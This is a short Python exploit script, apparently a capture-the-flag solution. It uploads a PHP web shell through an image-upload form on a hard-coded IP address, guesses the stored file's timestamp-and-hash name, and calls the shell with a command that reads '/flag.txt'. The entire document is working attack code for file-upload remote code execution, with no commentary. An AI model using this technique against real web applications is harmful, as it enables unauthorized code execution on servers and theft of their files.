#!/usr/bin/env python3

import requests
import threading
from time import time
from hashlib import sha1

def exploit(payload):
	data = {
		'name':'a',
		'mail':'xxx@xxx.com',
		'desc':'fasfa',
		'submit':''
	}

	files = {
		'image':open(payload, 'rb')
	}

	response = requests.post(url, files=files, data=data, verify=False)
	return True


url = 'http://103.127.99.14:10005/'
plname = 'halah.phtml'

start = int(time())
download_thread = threading.Thread(target=exploit, args=([plname]))
download_thread.start()
end = int(time())

command = "var_dump(readfile('/flag.txt'));"
hashimg = sha1(plname.encode()).hexdigest()

for t in range(start-5, start+5):
	shell = f'{url}tmp/{t}-{hashimg}.phtml?cmd={command}'
	print(shell)

	explt = requests.get(shell)
	if explt.status_code != 404:
		print(explt.text)
